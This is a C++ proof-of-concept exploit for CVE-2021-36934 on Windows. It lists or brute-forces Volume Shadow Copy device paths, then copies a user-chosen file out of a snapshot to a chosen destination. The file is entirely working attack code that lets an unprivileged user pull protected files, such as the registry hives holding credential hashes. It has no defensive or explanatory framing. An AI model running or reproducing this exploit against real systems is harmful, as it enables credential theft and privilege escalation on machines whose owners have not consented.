// poc_CVE-2021-36934.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#pragma once

#include "stdafx.h"

#include <iostream>
#include <atlbase.h>
#include <chrono>
#include <string>


#include <iomanip>
#include <iostream>
#include <limits>
#include <sstream>
#include <vector>

#include <wchar.h>
#include <conio.h>	

#include <stdio.h>

#include <atlstr.h>

//#include "util.h"

using namespace std;
using namespace ATL;
static int end_flag = 0;

BOOL WINAPI controlHandler(DWORD type) {
	if (type == CTRL_C_EVENT) {
		end_flag = 1;
		return TRUE;
	}
	return FALSE;
}


std::vector<VSS_PWSZ> FindShadowCopyStorageBruteForce() {
	std::vector<VSS_PWSZ>  vSnapshotDeviceList = { };

	int i = 1;
	wstring wBaseName = L"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy";
	size_t iBaseNameLength = wBaseName.length();
	size_t iAdditionalLength = 0;

	if (SetConsoleCtrlHandler(controlHandler, TRUE)) {
		cout << "Press Ctrl+C to interapt search" << endl;
	}

	while (end_flag == 0 ) {

		if (i == INT_MAX) {
			break;
		}
		
		wstring strFullPath = wBaseName + to_wstring(i);

		if (CheckPath((WCHAR*)(strFullPath + L"\\Windows").c_str())) {
			size_t iFullPathLength = wcslen(strFullPath.c_str());
			WCHAR *wFullPath = new WCHAR[iFullPathLength];
			wcsncpy_s(wFullPath, iFullPathLength + 2, strFullPath.c_str(), iFullPathLength);
			//wFullPath[iFullPathLength + 1] = L'\0';
			//cout << wcslen(wFullPath) << endl;


			vSnapshotDeviceList.push_back(wFullPath);
			wcout << L"Found VSS path: " << strFullPath << endl;
		}

		i++;
	}

	return vSnapshotDeviceList;
}

CComPtr<IVssBackupComponents> InitVSS() {
#pragma region Initialize
	if (FAILED(CoInitializeEx(NULL, 0)))
	{
		cout << "CoInitialize() failed\n";
		return(0);
	}

	if (FAILED(CoInitializeSecurity(
		NULL,
		-1,
		NULL,
		NULL,
		RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
		RPC_C_IMP_LEVEL_IDENTIFY,
		NULL,
		EOAC_NONE,
		NULL)))
	{
		cout << "CoInitializeSecurity() failed\n";
		return NULL;
	}


	CComPtr<IVssBackupComponents>   m_pVssObject;


	if (FAILED(CreateVssBackupComponents(&m_pVssObject)))
	{
		cout << "CreateVssBackupComponents() failed\n";
		return NULL;
	}

	if (FAILED(m_pVssObject->InitializeForBackup()))
	{
		cout << "IVssBackupComponents->InitializeForBackup() failed\n";
		return NULL;
	}


	// if(FAILED(m_pVssObject->SetContext(dwContext))) 
	if (FAILED(m_pVssObject->SetContext(VSS_CTX_ALL)))
	{
		cout << "IVssBackupComponents->SetContext() failed\n";
		return NULL;
	}

	/*
	if (FAILED(m_pVssObject->SetBackupState(true, true, VSS_BT_FULL, false)))
	{
		cout << "IVssBackupComponents->SetContext() failed\n";
		return(0);
	}*/

	return m_pVssObject;

}

void wait_for_remote_debug()
{
#pragma warning(disable: 6031) // Return value ignored: '_getch'
	printf("Hit any key to continue execution...\n");
	_getch();
#pragma warning(default: 6031)
}

int main()
{	
#ifdef DEBUG
	wait_for_remote_debug();
#endif // DEBUG
	   
	cout << "[.] Begin Initialize\t";
	CComPtr<IVssBackupComponents>   m_pVssObject = InitVSS();
	cout << "Done" << endl;
#pragma endregion

#pragma region EnumSnapshots
	int iSnapshotCount = 0;
	std::vector<VSS_PWSZ> vSnapshotDeviceList = { };

	cout << "[.] Get snapshots\t";

#ifdef DEBUG
	//cout << CheckPath(L"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy20\\logs\\evil.conf");
	//cout << endl;
	//cout << CheckFile(L"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy20\\logs\\evil.conf");
	//cout << endl;
	//_getch();
#endif // DEBUG


	if (m_pVssObject) {
		IVssEnumObject *m_pVssEnumObject = NULL;
		if (FAILED(m_pVssObject->Query(IID_NULL, VSS_OBJECT_NONE, VSS_OBJECT_SNAPSHOT, &m_pVssEnumObject))) {
			cout << "IVssBackupComponents::Query() failed\n";
			return(0);
		}


		cout << "Done";



		cout << endl << endl;


		ULONG ulFetched;
		VSS_OBJECT_PROP Prop;

		


		while (m_pVssEnumObject->Next(1, &Prop, &ulFetched) == S_OK) {
			iSnapshotCount++;
			cout << iSnapshotCount << ".";
			wcout << '\t' << Prop.Obj.Snap.m_pwszSnapshotDeviceObject << endl;
			vSnapshotDeviceList.push_back(Prop.Obj.Snap.m_pwszSnapshotDeviceObject);
		}
	}
	else {
		cout << endl;

		vSnapshotDeviceList = FindShadowCopyStorageBruteForce();

		if (vSnapshotDeviceList.capacity() == 0) {
			cout << "[-] No VSS volume found";
			return -1;
		}

		//cout << "vSnapshotDeviceList capacity = " << vSnapshotDeviceList.capacity() << endl;
		//cout << "vSnapshotDeviceList size = " << vSnapshotDeviceList.size() << endl;
		for (iSnapshotCount = 0; iSnapshotCount < vSnapshotDeviceList.size(); iSnapshotCount++) {
			try {
				cout << iSnapshotCount + 1 << ".";
				wcout << '\t' << vSnapshotDeviceList[iSnapshotCount] << endl;
			}
			catch (...) {

			}
		}

		cout << endl;
	}
#pragma endregion

#pragma region SnapshotSelect
SnapshotSelect:
	int iUserSelect = 0;
	std::wstring wstrUserSelect = L"";
	const WCHAR * wUserSelect;

	while (iUserSelect == 0 | iUserSelect > iSnapshotCount) {
		iUserSelect = 0;
		wstrUserSelect = L"";
		cout << "Select: ";
		wcin >> wstrUserSelect;

		wUserSelect = wstrUserSelect.c_str();
		//wcout << "Check: " << wstrUserSelect;

		iUserSelect = stoi(wstrUserSelect);
		

		wcin.clear();

	}	
#pragma endregion


#pragma region GetRelativeFilePath

	bool bUserInputWait = true;
	std::wstring wstrRelativeFilePath = L"";

	while (bUserInputWait) {
		wstrRelativeFilePath = L"";
		cout << "Input relative SOURCE file path (no drive): ";
		wcin >> wstrRelativeFilePath;
		wcin.clear();

		if (wstrRelativeFilePath.find(L":") != wstring::npos) {
			cout << "[!] Path should not contain disk like c:\\" << endl;
			continue;
		}
	

		bUserInputWait = false;

		
	}
#pragma endregion


#pragma region ConcatPath
	

	size_t iSnapshotBasePathLenth = wcslen(vSnapshotDeviceList[iUserSelect-1]) + 1;
	size_t iRelativeFilePathLength = wstrRelativeFilePath.length();

	
	WCHAR *wFullPath = new WCHAR[iSnapshotBasePathLenth + iRelativeFilePathLength + 1];
	wcsncpy(wFullPath, vSnapshotDeviceList[iUserSelect - 1], iSnapshotBasePathLenth);

	wcsncat_s(wFullPath, (iSnapshotBasePathLenth + iRelativeFilePathLength), wstrRelativeFilePath.c_str(), iRelativeFilePathLength);
	
#pragma endregion


#pragma region CheckForFile
	WIN32_FIND_DATA FindFileData;

	if (!CheckPath(wFullPath))
	{
		setlocale(LC_ALL, "");				// костыль для поддержки русского языка
		LPWSTR test = pGetLastError(GetLastError());
		wprintf(L"[-] File access failed: %s\n\n\n", test);
		//return -1;
		goto SnapshotSelect;
	}

#pragma endregion


#pragma region GetDestPath

	bUserInputWait = true;
	wstring wstrDestFilePath = L"";
	
	while (bUserInputWait) {
		wstrDestFilePath = L"";
		wcout << "Input relative DESTINATION file path (with drive): ";
		wcin >> wstrDestFilePath;
		wcin.clear();

		if (wstrDestFilePath.find(L":") == wstring::npos) {
			cout << "[!] Destination path should contain disk c:\\" << endl;
			continue;
		}

		bUserInputWait = false;


	}


#pragma endregion


#pragma region LoadFile
	/*
	HANDLE hSrcFile;
	HANDLE hDstFile;
	
	hSrcFile = CreateFileW(wFullPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hSrcFile == INVALID_HANDLE_VALUE) {
		cout << "[-] Failed to open Source file" << endl;
		return -1;
	}

	hDstFile = CreateFileW(wstrDestFilePath.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hDstFile == INVALID_HANDLE_VALUE) {
		cout << "[-] Failed to open Destination file" << endl;
		return -1;
	}
	*/

	if (CopyFile(wFullPath, wstrDestFilePath.c_str(), true) == ERROR_SUCCESS) {
		cout << "[-] Failed to copy files" << endl;
		//return -1;
	}
	else {
		wcout << L"[+] File saved: " << wstrDestFilePath << endl << endl << endl;
	}
	goto SnapshotSelect;


#pragma endregion

}
